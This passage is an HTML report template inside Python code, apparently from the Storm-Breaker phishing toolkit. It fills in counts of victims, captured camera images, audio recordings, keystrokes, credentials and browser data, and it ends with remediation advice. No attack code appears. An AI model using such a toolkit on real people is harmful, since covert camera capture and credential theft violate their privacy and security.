    .stat-box {{ background: white; border-radius: 12px; padding: 20px; text-align: center; box-shadow: 0 2px 8px rgba(0,0,0,0.06); transition: transform 0.2s; }}
    .stat-box:hover {{ transform: translateY(-2px); }}
    .stat-box .number {{ font-size: 32px; font-weight: 800; }}
    .stat-box .label {{ font-size: 11px; color: #64748b; text-transform: uppercase; letter-spacing: 1px; margin-top: 4px; }}
    .risk-matrix {{ display: grid; grid-template-columns: repeat(4, 1fr); gap: 12px; margin-bottom: 30px; }}
    .risk-box {{ border-radius: 12px; padding: 16px; text-align: center; color: white; }}
    .risk-box .count {{ font-size: 28px; font-weight: 800; }}
    .risk-box .label {{ font-size: 11px; text-transform: uppercase; letter-spacing: 1px; opacity: 0.9; }}
    .footer {{ text-align: center; padding: 30px; font-size: 12px; color: #94a3b8; border-top: 2px solid #e2e8f0; margin-top: 40px; }}
    a {{ color: #3b82f6; text-decoration: none; }}
    a:hover {{ text-decoration: underline; }}
    @media print {{ body {{ background: white; }} .page {{ max-width: 100%; }} .cover {{ break-after: page; }} }}
</style>
</head>
<body>
<div class="page">
    <!-- Cover Page -->
    <div class="cover">
        <div style="font-size:52px;margin-bottom:20px;position:relative;">⚡</div>
        <h1>{title}</h1>
        <div class="meta">Prepared for: <strong>{target}</strong></div>
        <div class="meta">Prepared by: <strong>{org}</strong></div>
        <div class="meta">Lead Assessor: <strong>{author}</strong></div>
        <div class="meta">Date: <strong>{date}</strong></div>
        <div class="meta">Report ID: <strong>SB-{datetime.now().strftime('%Y%m%d')}-{hash(title) % 10000:04d}</strong></div>
        <div><div class="risk-badge">Overall Risk: {risk_label} ({overall_risk}/10.0)</div></div>
        <div class="classification">{classification}</div>
    </div>

    <!-- Table of Contents -->
    <div class="section">
        <h2>📑 Table of Contents</h2>
        {toc_html}
    </div>

    <!-- Executive Summary -->
    <div class="section" id="exec-summary">
        <h2>📋 Executive Summary</h2>
        <div style="background:white;border-radius:12px;padding:28px;box-shadow:0 2px 8px rgba(0,0,0,0.06);line-height:1.8;">
            <p>This report documents the findings of a social engineering penetration test conducted against <strong>{target}</strong>
            on <strong>{date}</strong>. The assessment was performed by <strong>{org}</strong> under the direction of <strong>{author}</strong>.</p>

            <p style="margin-top:16px;">The assessment utilized browser-based phishing pages to evaluate the organization's susceptibility
            to social engineering attacks targeting device sensors, authentication mechanisms, and data exfiltration vectors.</p>

            <div style="background:#f8fafc;border-radius:8px;padding:16px;margin-top:16px;border-left:4px solid {risk_color};">
                <strong>Overall Risk Rating: <span style="color:{risk_color};">{risk_label}</span> ({overall_risk}/10.0)</strong>
                <p style="margin-top:8px;color:#64748b;">The assessment identified <strong>{len(findings)}</strong> finding(s) with a maximum CVSS score of <strong>{max_cvss}</strong>. A total of <strong>{stats['victims']}</strong> unique victim(s) were identified across <strong>{stats['unique_ips']}</strong> unique IP address(es).</p>
            </div>

            <p style="margin-top:16px;">Evidence collected includes <strong>{stats['images']}</strong> camera image(s),
            <strong>{stats['audio']}</strong> audio recording(s), <strong>{stats['fingerprints']}</strong> device fingerprint(s),
            <strong>{stats['keystrokes']}</strong> keystroke log(s), <strong>{stats['credentials']}</strong> credential set(s),
            and <strong>{stats['browser_exfil']}</strong> browser data exfiltration(s).</p>
        </div>
    </div>

    <!-- Scope & Methodology -->
    <div class="section" id="scope">
        <h2>🎯 Scope & Methodology</h2>
        <div style="display:grid;grid-template-columns:1fr 1fr;gap:20px;">
            <div style="background:white;border-radius:12px;padding:24px;box-shadow:0 2px 8px rgba(0,0,0,0.06);">
                <h3 style="font-size:15px;margin-bottom:12px;color:#1e293b;">📌 Assessment Scope</h3>
                <p style="color:#64748b;font-size:14px;line-height:1.7;">{scope}</p>
                <ul style="margin-top:12px;padding-left:18px;color:#64748b;font-size:13px;line-height:2;">
                    <li>Browser-based camera/microphone access</li>
                    <li>Device fingerprinting & tracking</li>
                    <li>Keystroke capture via JavaScript</li>
                    <li>Geolocation & IP intelligence</li>
                    <li>Credential harvesting</li>
                    <li>Browser data exfiltration</li>
                    <li>Network reconnaissance via WebRTC</li>
                </ul>
            </div>
            <div style="background:white;border-radius:12px;padding:24px;box-shadow:0 2px 8px rgba(0,0,0,0.06);">
                <h3 style="font-size:15px;margin-bottom:12px;color:#1e293b;">🔧 Methodology</h3>
                <ol style="padding-left:18px;color:#64748b;font-size:13px;line-height:2;">
                    <li><strong>Reconnaissance</strong> — Target identification and template selection</li>
                    <li><strong>Weaponization</strong> — Phishing page creation with attack modules</li>
                    <li><strong>Delivery</strong> — URL distribution via selected channels</li>
                    <li><strong>Exploitation</strong> — Victim interaction and permission grants</li>
                    <li><strong>Collection</strong> — Data capture and exfiltration</li>
                    <li><strong>Analysis</strong> — Evidence correlation and risk assessment</li>
                    <li><strong>Reporting</strong> — Documentation and remediation guidance</li>
                </ol>
                <div style="margin-top:12px;padding:10px;background:#f8fafc;border-radius:6px;font-size:11px;color:#94a3b8;">
                    Framework: MITRE ATT&CK (T1598, T1566, T1056, T1113, T1005)
                </div>
            </div>
        </div>
    </div>

    <!-- Stats Dashboard -->
    <div class="section" id="stats">
        <h2>📊 Assessment Statistics</h2>
        <div class="stat-grid">
            <div class="stat-box">
                <div class="number" style="color:#3b82f6;">{stats['victims']}</div>
                <div class="label">Victims</div>
            </div>
            <div class="stat-box">
                <div class="number" style="color:#8b5cf6;">{stats['images']}</div>
                <div class="label">Images</div>
            </div>
            <div class="stat-box">
                <div class="number" style="color:#ec4899;">{stats['audio']}</div>
                <div class="label">Audio</div>
            </div>
            <div class="stat-box">
                <div class="number" style="color:#06b6d4;">{stats['fingerprints']}</div>
                <div class="label">Fingerprints</div>
            </div>
            <div class="stat-box">
                <div class="number" style="color:#ef4444;">{stats['keystrokes']}</div>
                <div class="label">Keystrokes</div>
            </div>
            <div class="stat-box">
                <div class="number" style="color:#f59e0b;">{stats['unique_ips']}</div>
                <div class="label">Unique IPs</div>
            </div>
            <div class="stat-box">
                <div class="number" style="color:#10b981;">{stats['credentials']}</div>
                <div class="label">Credentials</div>
            </div>
            <div class="stat-box">
                <div class="number" style="color:#6366f1;">{stats['total_evidence']}</div>
                <div class="label">Total Evidence</div>
            </div>
        </div>
    </div>

    <!-- Risk Matrix -->
    <div class="section" id="risk-matrix">
        <h2>🎯 Risk Matrix</h2>
        <div class="risk-matrix">
            <div class="risk-box" style="background:#dc2626;">
                <div class="count">{severity_counts.get('Critical', 0)}</div>
                <div class="label">Critical</div>
            </div>
            <div class="risk-box" style="background:#ea580c;">
                <div class="count">{severity_counts.get('High', 0)}</div>
                <div class="label">High</div>
            </div>
            <div class="risk-box" style="background:#ca8a04;">
                <div class="count">{severity_counts.get('Medium', 0)}</div>
                <div class="label">Medium</div>
            </div>
            <div class="risk-box" style="background:#16a34a;">
                <div class="count">{severity_counts.get('Low', 0) + severity_counts.get('Info', 0)}</div>
                <div class="label">Low/Info</div>
            </div>
        </div>
        <div style="background:white;border-radius:12px;padding:20px;box-shadow:0 2px 8px rgba(0,0,0,0.06);">
            <table style="width:100%;border-collapse:collapse;font-size:13px;">
                <thead>
                    <tr style="border-bottom:2px solid #e2e8f0;text-align:left;">
                        <th style="padding:8px;color:#64748b;">ID</th>
                        <th style="padding:8px;color:#64748b;">Finding</th>
                        <th style="padding:8px;color:#64748b;">Severity</th>
                        <th style="padding:8px;color:#64748b;">CVSS</th>
                        <th style="padding:8px;color:#64748b;">CWE</th>
                    </tr>
                </thead>
                <tbody>
                    {''.join(f'<tr style="border-bottom:1px solid #f1f5f9;"><td style="padding:8px;font-family:monospace;color:#475569;">{f["id"]}</td><td style="padding:8px;"><a href="#finding-{f["id"]}">{f["title"]}</a></td><td style="padding:8px;"><span style="background:{f["color"]};color:white;padding:2px 8px;border-radius:10px;font-size:11px;">{f["severity"]}</span></td><td style="padding:8px;font-weight:600;">{f["cvss_score"]}</td><td style="padding:8px;font-size:11px;color:#64748b;">{f["cwe"]}</td></tr>' for f in findings)}
                </tbody>
            </table>
        </div>
    </div>

    <!-- Findings -->
    <div class="section" id="findings">
        <h2>🔍 Detailed Findings</h2>
        {findings_html}
    </div>

    <!-- Identified IPs -->
    <div class="section" id="ips">
        <h2>🌐 Identified IP Addresses</h2>
        <div style="background:white;border-radius:12px;padding:20px;box-shadow:0 2px 8px rgba(0,0,0,0.06);">
            {ips_html if ips_html else '<span style="color:#94a3b8;">No IPs captured</span>'}
        </div>
    </div>

    <!-- Browser & OS Distribution -->
    <div class="section" id="environment">
        <h2>🖥️ Target Environment</h2>
        <div style="display:grid;grid-template-columns:1fr 1fr;gap:20px;">
            <div style="background:white;border-radius:12px;padding:20px;box-shadow:0 2px 8px rgba(0,0,0,0.06);">
                <h3 style="font-size:14px;margin-bottom:12px;color:#475569;">🌐 Browser Distribution</h3>
                {browsers_html if browsers_html else '<span style="color:#94a3b8;">No data</span>'}
            </div>
            <div style="background:white;border-radius:12px;padding:20px;box-shadow:0 2px 8px rgba(0,0,0,0.06);">
                <h3 style="font-size:14px;margin-bottom:12px;color:#475569;">💻 Operating Systems</h3>
                {os_html if os_html else '<span style="color:#94a3b8;">No data</span>'}
            </div>
        </div>
    </div>

    <!-- Timeline -->
    <div class="section" id="timeline">
        <h2>📅 Event Timeline</h2>
        <div style="background:white;border-radius:12px;padding:24px;box-shadow:0 2px 8px rgba(0,0,0,0.06);max-height:600px;overflow-y:auto;">
            {timeline_html if timeline_html else '<p style="color:#94a3b8;">No events recorded during the assessment period</p>'}
        </div>
    </div>

    <!-- Recommendations -->
    <div class="section" id="recommendations">
        <h2>✅ Recommendations Summary</h2>
        <div style="background:white;border-radius:12px;padding:28px;box-shadow:0 2px 8px rgba(0,0,0,0.06);">
            <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px;">
                <div>
                    <h4 style="font-size:14px;color:#dc2626;margin-bottom:10px;">🔴 Immediate (Critical)</h4>
                    <ol style="padding-left:18px;line-height:2;font-size:13px;color:#475569;">
                        <li>Deploy <strong>phishing-resistant MFA</strong> (FIDO2/WebAuthn)</li>
                        <li>Implement <strong>Content Security Policy</strong> headers</li>
                        <li>Enable <strong>browser security policies</strong> for media access</li>
                        <li>Deploy <strong>endpoint detection & response (EDR)</strong></li>
                    </ol>
                </div>
                <div>
                    <h4 style="font-size:14px;color:#ea580c;margin-bottom:10px;">🟠 Short-term (High)</h4>
                    <ol style="padding-left:18px;line-height:2;font-size:13px;color:#475569;">
                        <li>Enforce <strong>HTTPS everywhere</strong> with HSTS</li>
                        <li>Deploy <strong>DNS filtering</strong> for phishing domains</li>
                        <li>Implement <strong>WebRTC leak prevention</strong></li>
                        <li>Configure <strong>cookie security flags</strong> (HttpOnly, Secure, SameSite)</li>
                    </ol>
                </div>
            </div>
            <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-top:16px;">
                <div>
                    <h4 style="font-size:14px;color:#ca8a04;margin-bottom:10px;">🟡 Medium-term (Medium)</h4>
                    <ol style="padding-left:18px;line-height:2;font-size:13px;color:#475569;">
                        <li>Conduct <strong>security awareness training</strong></li>
                        <li>Deploy <strong>anti-fingerprinting</strong> browser extensions</li>
                        <li>Implement <strong>browser isolation</strong> technology</li>
                        <li>Enable <strong>login anomaly detection</strong></li>
                    </ol>
                </div>
                <div>
                    <h4 style="font-size:14px;color:#16a34a;margin-bottom:10px;">🟢 Long-term (Low)</h4>
                    <ol style="padding-left:18px;line-height:2;font-size:13px;color:#475569;">
                        <li>Standardize <strong>browser configurations</strong></li>
                        <li>Implement <strong>zero-trust architecture</strong></li>
                        <li>Regular <strong>red team exercises</strong></li>
                        <li>Continuous <strong>credential breach monitoring</strong></li>
                    </ol>
                </div>
            </div>
        </div>
    </div>

    <div class="footer">
        <p>Generated by <strong>Storm-Breaker v4.0</strong> Report Engine</p>
        <p>Classification: {classification} | Report Date: {date} | Overall Risk: {risk_label}</p>
        <p style="margin-top:8px;font-size:10px;">This report is intended for authorized recipients only. Unauthorized distribution is strictly prohibited.</p>
        <p style="font-size:10px;color:#cbd5e1;">Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')}</p>
    </div>
</div>
</body>
</html>'''
